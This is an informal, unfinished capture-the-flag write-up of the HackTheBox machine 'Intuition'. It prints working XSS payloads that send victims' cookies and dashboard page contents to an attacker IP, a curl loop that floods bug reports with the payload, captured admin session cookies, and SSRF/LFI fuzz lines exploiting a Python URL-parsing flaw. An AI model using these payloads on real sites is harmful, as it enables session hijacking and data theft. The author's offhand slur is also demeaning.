# Anomalies : Intuition Writeup

Name: Intuition
Date:  
Difficulty: Hard
Goals:  
- Dyslexia is being a special kind of Retarded -  

Learnt:
- SpeeeeellChEckInG TimE
- URL encoding payload
- JavaScript
Beyond Root:
- New XSS THM Room completion
- New Race Conditions THM Room completion
- Schooled.htb Guided completion
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Wreath/Screenshots/ping.png)

Redirect to domain of comprezzor
![](curlfortheredirect.png)

This is a bit of a tease for a recent as of 2024 LZMA ssh backdoor that hit some rolling and dev distros of Linux, but the file upload works and is import for escalation on the site at a later point
![](comprezzorwww-root.png)

We as a unauthenticated user can report a bug
![](reportbug-comprezzor.png)

- https://launchpad.net/ubuntu/+source/openssh/1:8.9p1-3ubuntu0.7 
- 
- not
	- https://ubuntu.com/security/CVE-2024-3094
	- https://www.rapid7.com/blog/post/2024/04/01/etr-backdoored-xz-utils-cve-2024-3094
	- https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know
	- https://www.logpoint.com/en/blog/emerging-threats/xz-utils-backdoor/
-
-
https://medium.com/@marduk.i.am/exploiting-cross-site-scripting-to-steal-cookies-3d14c8b42fae
```html
<img src=x onerror="this.src='http://10.10.14.29:8888/'+document.cookie; this.removeAttribute('onerror');">

<script><img src=x onerror="this.src='http://10.10.14.29:8888/'+document.cookie; this.removeAttribute('onerror');"></script>

<!-- https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies -->
<script> fetch('http://10.10.14.29:8888', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

<script>fetch('http://10.10.14.29');</script>

<script>fetch('http://10.10.14.29')</script>

<script>new Image().src="http://$attacker-ip:port/cookiejar.jpg?output="+document.cookie;</script>
```

https://gist.github.com/YasserGersy/a0fee5ce7422a558c84bfd7790d8a082 - javascript mutli lines payload into one line
https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81



We can enumerate usernames with the register page
![](adminexists.png)

Here began after being informed by a team mate out that there is XSS, which he definately managed to make work, where I could not for many hours of wait for Cookies.
![](xssattempt.png)

This spawned days of improving what I have learnt about XSS to find out there is also a Race Condition to add to my struggles of not receiving Cookies for many hours I did receive some on other boxes like the [[Schooled-Helped-Through]] machine. 
![](aboutreports.png)
I noticed the HttpOnly flag so this machine is beyond what thought possible and if I had known the out from the recent move in discord servers of HackSmarter team I would have dismissed his claims. Sometimes it is about who you know in a perspective shifting mind bending kind of way. [HttpOnly OWASP; URL: https://owasp.org/www-community/HttpOnly](https://owasp.org/www-community/HttpOnly)
![](httponlyflag.png)

For complete visibility over the potential on escalation at some point I tested the file upload functionality. I am also sure I am also really trying to build in packets and connections in doing anything. The how and why.. and the endless questions of actually making some sort of way towards an acceptable spending my first Saeculum, to learning from my endless failings and mistakes.
![](fileuploadhijackattempt.png)

Apparently this form-container is where out managed to escalate again at some point in stages of escalation
![](flashmessagedouble.png)

Looking at the Cookie in Cyberchef
![](cyberchefthecookie.png)

Having made at least four hours of attempts at waiting for 30-60 seconds for cookie, I am openly keen to be helped. 

Get some cookies, reset if it does not work - (out: HackSmarter)
```html
<script>fetch("http://10.10.14.39"+document.cookies)</script>
```
![](cookiespleasethxouthopefully.png)

And because I have distinct memory of waiting all saturday night for nothing I will get on with some thing else while this cookie deliver service accepts my orders.
![](andwaitforcookies.png)
[I will leave this in for the amount I times I have said, written, heard, read and thought about the word: cookies, not cookie.](https://www.youtube.com/watch?v=I5e6ftNpGsU)

Correct cookie\* not cookies
```html
<script>fetch("http://10.10.14.39:8445/"+document.cookie)</script>
```

After a good [reminder and visual proof that I am in fact the hardest R](https://www.youtube.com/watch?v=tb2Ct3yyB4g)
![](cookieacquired.png)
The CRUCIAL SEES information here is:
Situational Awareness: the cookie's origin is from a DIFFERENT domain!
Example: Therefore a person review bugs would view them on a different part of the site - a dashboard to respond to issues
Explanation: other than this in a meta way - we can the use the pattern of this exploiting and return data to us from the dashboard domain to
Strategically: do something on that domain.

Because we know this is a CTF and know that there is a way to root somehow, the limitation of what we a can then Read from WiRE (Write, Is-it-a-rabbithole?, Read, Execute) - we can execute anything like RCE from the XSS because of how the server is handling our payload - it is embedded in a bug report 
- we are not popping a popup like its 1998-2010 and hoping some poor fool really wants our free Cookies please click the link)
- we are not able to get the server to write data through this payload, because we are speaking HTML, web  and JavaScript that the server can understand - send us cookie please.

Understand the all systems in the context, before introducing your own

Understand the Systems and Sub Systems
Understand the Systems' Users
Understand the System's Use Cases
Understand the Systen

-> Hack the Systems.

Schematism (meticulously collect artefacts of the context into a mental model), Understand (RTFM, work out what is going on, how it should work), Measure (spellcheck your payloads fool) and PWN
Become the [SUMP](https://en.wikipedia.org/wiki/Sump#:~:text=A%20sump%20is%20a%20low,water%20and%20recharge%20underground%20aquifers.) of all the other humans' ingenuity.

##### out's payload && Beyond Root before root, when machine is retired 

More for personal revision and addition something I add for all the help I got; we could also use chisel as a proxy server to then forward that to burp. As actually over kill as that is 


To do after the box retires the below is from memory - I know I am missing from flags
```bash
# Recieve traffic from HTB interface to chisel
chisel client 127.0.0.1:10000 HTBVPNInterface:80:127.0.0.1:8081
# Serve traffic to second client
chisel server 127.0.0.1:10000 
# Forward to burp from 8081 localhost to 8080
chisel client 1127.0.0.1:10000 127.0.0.1:8081:127.0.0.1:8080
```


This is where out's payload to browse the Dashboard domain: (out: HackSmarter)
```html
<script> 
var url = "http://dashboard.comprezzor.htb/backup";
var xhr = new XMLHttpRequest();
xhr.open("GET",url,false);
xhr.send();
var resp = xhr.responseText;
var xhr2.open("POST","http://mymachine:port/",false);
xhr2.send(resp);
</script>
```

This payload sends a request to get a url then send it back to our `nc -lvnp` as to view the data. 
- [developer.mozilla.org: XMLHttpRequest_API documentation](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest_API/Using_XMLHttpRequest)
![]()


```html
<script> var url = "http://dashboard.comprezzor.htb/backup";var xhr = new XMLHttpRequest();xhr.open("GET",url,false);xhr.send();var resp = xhr.responseText;var xhr2.open("POST","http://10.10.14.39:8445/",false);xhr2.send(resp);</script>
```

Here was my spelling mistakes that lost me at least 20-30 minutes:
```html
<script>var url="http://dashboard.comprezzor.htb/backup"; var xhr-new XMLHttpRequest();
xhr.open("GET",url,false); xhr.send(); var resp=xhr.reponse.Text();var xhr2.open("POST","http://10.10.14.39:8554",false); xhr2.send(resp);</script>

<script>var+url%3d"http%3a//dashboard.comprezzor.htb/backup"%3b+var+xhr-new+XMLHttpRequest()%3bxhr.open("GET",url,false)%3b+xhr.send()%3b+var+resp%3dxhr.response.Text()%3bvar+xhr2.open("POST","http%3a//10.10.14.39:8445",false)%3b+xhr2.send(resp)%3b</script>
```

#### Back to cookie snatching

After doing some checks on the cookie
```
eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4

eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImFzZCIsICJyb2xlIjogInVzZXIifXxhMTJmZjZlMTRkMzdjNmU1NjcwYWYzY2Q5MTVjY2ZhNWIwZTVjN2JjMTIzOTM1NTZjMWYwNzk2NDNlMWVlMzg2
```
I am able to view the dashboard subdomain, but I really wanted to nmake the above payload work
![](Icouldhaveusedthecookiebutmybrainstillwantstoknowhowtoenumeratewiththexss.png)

Recon in the background with the known good tried and true is good
![](reconinthebackground.png)

Remembering back to how these reports are handled...
![](aboutreports.png)

Next question is how to escalate with what we can do on a web application like this. The hint on the discord being that we need to escalate it before our tier of user context reads it automatically by what every automated users are here to do that
![](priorityracecondition.png)

The priority levels are just 0 or 1
```
/change_priority?report_id=1&priority_level=1
```


![](thebuttonsworkgoodbyefeaturerequest.png)

For example: making sure Karen can.. *"SPEAK TO THE MANAGER please, don't talk to me like that, why are you filming, I'm filming. This error is unacceptable, I need to speak to a manager please"*:
![](changingthekarenpriority.png)


So from here we need could make this very easy for our selves and delete all the reports rather than worry about the dynamism as there is less than two days till no more points. 
![](testingraceconditions.png)

![](interesting.png)

![](anditsgone.png)

So the next ID will be 38 and so on. The best way I can think of is to automate this to reduce human speed issues.

Although this approach is good, I think that in hindsight about the time limits I have it would now be better to do this in burpsuite, but as a Beyond Root post-box-retirement I will try this and also as a python script instead.
```bash
for ID in $(seq 40 100); do
curl -X POST -L "http://report.comprezzor.htb/report_bug" -H 'Cookie: user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4' -d 'report_title=Cookies+please&description=<script>+var+url+%3d+"http%3a//dashboard.comprezzor.htb/backup"%3bvar+xhr+%3d+new+XMLHttpRequest()%3bxhr.open("GET",url,false)%3bxhr.send()%3bvar+resp+%3d+xhr.responseText%3bvar+xhr2.open("POST","http%3a//10.10.14.39%3a8445/",false)%3bxhr2.send(resp)%3b</script>';
sleep 1;
curl -X POST "http://dashboard.comprezzor.htb/report/$ID/change_priority?report_id=$ID&priority_level=1" -H 'Cookie: user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4';
done
```

The set priority part did not work, but I did spam the the bug reporting form and each was slowly consumed, by the script on the machine
![](spammedthemandsetthemmaunally.png)

![](tilltherewasnone.png)

The payload did not work through `curl` for spellchecking or encoding reasons. So after a break and cookie spelling issues again:
```html
<script>fetch("http://10.10.14.39:8445/"+document.cookie)</script>
```

```
eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUy
YTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
```

![](yeeeeeeeeeeeeeeeeeeeeeCoOkIe.png)

```
eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUy
YTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4

```
![](eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4.png)

Presumably this is the admin cookie, it seems exactly the same as the adam one. The reason is a race conditioned myself and looked at it 
```
eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUy
YTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4

eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
```

![](HURRAY.png)

```
eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
```

![](wearewebadminnow.png)

For the dyslexics amongst my few readers my number one hacking tool is `gospider` - extracts all the links and forms and outputs them to a file even crawls the site to find more! My early CTF THM pain of the hint is in the source code...pains. Although in this case it is not that useful. We can also pass a cookie and get even more attack surface and enumeration coverage.
![](thegreattop10hackingtool.png)

Either we can now:
- Create a backup 
- Create a PDF report 

One of the hints that was on the Discord was `id_rsa` key, because this beast of a command I did not know you could easily check the owner of the `id_rsa` key: 

Get the user of a ssh-rsa id_rsa key: (Urck: HackSmarter)
```
ssh-keygen -y -f id_rsa
```

So because of the errors trying to create a report presumably we can back and download the `id_rsa`. From trying a season being dragged along more than dragging others or being more than a CTF gopher. I notice the wonky reasoning that can come from doing these with others. So maybe we use the admin cookie to download a file we specify from the target machine a not from our machine.
![](nvmNoPartPOSTedGETmaybe.png)
But that request method was not the issues, I tried making my own `id_rsa` to them use that as a surrogate, but even with all files selected that did not work in uploading that and modifying the request.

```
Content-Disposition: form-data; name="file"; filename="/home/adam/.ssh/id_rsa"
```

![](postingbackup405.png)

```
Serving HTTP on 0.0.0.0 port 8445 (http://0.0.0.0:8445/) ...
10.10.14.39 - - [03/May/2024 15:42:05] code 404, message File not found
10.10.14.39 - - [03/May/2024 15:42:05] "GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 404 -
10.129.95.168 - - [03/May/2024 15:42:11] code 404, message File not found
10.129.95.168 - - [03/May/2024 15:42:11] "GET /user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 HTTP/1.1" 404
```

I tried to just readFile() to see if that works, which it did not.
```html
<script>fetch("http://10.10.14.39:8445/"+readFile("/home/adam/.ssh/id_rsa"))</script>
```

Ok the next step is LFI in how URLs are parsed in python:
https://infosecwriteups.com/understanding-cve-2023-24329-python-urlparse-function-7c064dee5639

*Description: An issue in the urllib.parse component of Python before 3.11.4 allows attackers to bypass blocklisting methods by supplying a URL that starts with blank characters*

So simple and concise: ` http://cve2023-24329`

*impact: Due to this issue, attackers can bypass any domain or protocol filtering method implemented with a blocklist. Protocol filtering failures can lead to arbitrary file reads, arbitrary command execution, SSRF, and other problems.*

I took the idea that it was an LFI and tried localhost, domains of comprezzor.htb


![](wecancallback.png)

https://ask.libreoffice.org/t/how-can-i-save-my-docs-in-pdf/42399#:~:text=If%20you're%20asking%20how,keep%20the%20original%20as%20is.
![](gleamingthecuuuuuuuuube.png)
[Did not realise this was a film about skateboarding, but funny none the less](https://www.youtube.com/watch?v=_mBy6xMUpM8)
![](nogleamingandmycubeissafememe.png)
[Wikipedia - Gleaming the Cube](https://en.wikipedia.org/wiki/Gleaming_the_Cube), A-Team the small wonder, Grinding the log stroker, wow did they bypass twitchs amy filter on that.. The hackers 1995 soundtrack is pretty good though if that is a realistic takeway from this [Youtube Hackers Soundtrack](https://www.youtube.com/watch?v=k07cflKCl-Y&list=PL6E1AC915A0204BC0&index=1)

I really want the LFI and although I there was a password leaked in the discord. I would rather try myself
![](reallywantthelfi.png)
I changed another spelling error and decided to go with the jhaddix LFI list from Seclists
![](nolfion127001.png)

Protocol : Domain
```
report_url=+http://127.0.0.1/FUZZ
report_url=+ftp://127.0.0.1/FUZZ
report_url=+http://comprezzor.htb/FUZZ
report_url=+ftp://localhost/FUZZ
report_url=+ftp://localhostFUZZ
report_url=+ftp://comprezzor.htb/FUZZ
report_url=+ftp://10.129.95.168/FUZZ
report_url=+http://10.129.95.168/FUZZ
```

Because FTP was hinted I decided to peak at what the actually directory structure was like rather than spraying and praying
![](becauseftpwashinted.png)

Tried some python command injection then I decided the best way to bridge the way to get there would be to get find where the password is actually located and then work to get there rather than continue with Linpeas and Pspy and breeze through why I am not hitting this LFI like those that had finished this.

!['](notsurewheretofindit.png)







![](multiprivesctogo.png)

`/var/www/html` and `/var/www/app` now
![](usersdbfile.png)

![](dbfile.png)

![](nameaspassword.png)

Tried `adam` and `dev_acc` `su` and `ssh`
```
adam gray
```

Next question was where is ftp running maybe that is the password if it is not zero auth.

![](ftpinasthegrayadam.png)


```bash
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```

```c
// Version : 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"
int check_auth(const char *  auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char * )auth_key, strlen(auth_key), digest);
    char md5_str[33];
    for (int i = 0;
    i < 16;
    i++) {
        sprintf(&md5_str[i * 2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0)  {
        return 1;
    } else {
        return 0;
    }

}

void listPlaybooks() {
    DIR  * dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL)  {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent  * entry;
    int playbookNumber = 1;
    while ((entry = readdir(dir)) != NULL)  {
        if (entry -  > d_type == DT_REG && strstr(entry -  > d_name, ".yml") != NULL)  {
            printf("%d: %s\n", playbookNumber, entry -  > d_name);
            playbookNumber++;
        }

    }

    closedir(dir);
}

void runPlaybook(const char  * playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char  * roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char  * argv[]) {
    if (argc < 2)  {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];
    for (int i = 2;
    i < argc;
    i++) {
        if (strcmp(argv[i], "-a") == 0)  {
            if (i  +  1 < argc)  {
                strncpy(auth_key, argv[i  +  1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }

        }

    }

    if (!check_auth(auth_key))  {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0)  {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0)  {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0)  {
            DIR  * dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL)  {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent  * entry;
            int currentPlaybookNumber = 1;
            char  * playbookName = NULL;
            while ((entry = readdir(dir)) != NULL)  {
                if (entry -  > d_type == DT_REG && strstr(entry -  > d_name, ".yml") != NULL)  {
                    if (currentPlaybookNumber == playbookNumber)  {
                        playbookName = entry -  > d_name;
                        break;
                    }

                    currentPlaybookNumber++;
                }

            }

            closedir(dir);
            if (playbookName != NULL)  {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }

        } else {
            printf("Invalid playbook number.\n");
        }

    } else if (strcmp(argv[1], "install") == 0)  {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    return 0;
}
```


![](runnerbinary.png)

![](testingwithauthhashandwithout.png)

![](sysadmgroupcontainsadamandlopez.png)

We cannot write to that directory. 

I still with access to the box find the password
![](sudolforlopez.png)
https://docs.ansible.com/ansible/latest/collections/ansible/builtin/from_json_filter.html#:~:text=Ansible%20automatically%20converts%20JSON%20strings,automatic%20conversion%20does%20not%20happen.
![](noescjsonthen.png)

sudo /opt/runner2/runner2 esc.json -a 0feda17076d793c2ef2870d7427ad4ed


https://json-c.github.io/json-c/json-c-0.10/doc/html/json__object_8h.html#acc3628d97c6308dc967006e4268c4e7f

| Struct [json_object](https://json-c.github.io/json-c/json-c-0.10/doc/html/structjson__object.html)* json_object_get |     | struct [json_object](https://json-c.github.io/json-c/json-c-0.10/doc/html/structjson__object.html) * | _obj_ | )   | `[read]` |
| ------------------------------------------------------------------------------------------------------------------- | --- | ---------------------------------------------------------------------------------------------------- | ----- | --- | -------- |
Increment the reference count of [json_object](https://json-c.github.io/json-c/json-c-0.10/doc/html/structjson__object.html), thereby grabbing shared ownership of obj.




![](ghidra1.png)
## Exploit

## Foothold

## Privilege Escalation

## Post Root Reflection

## Beyond Root


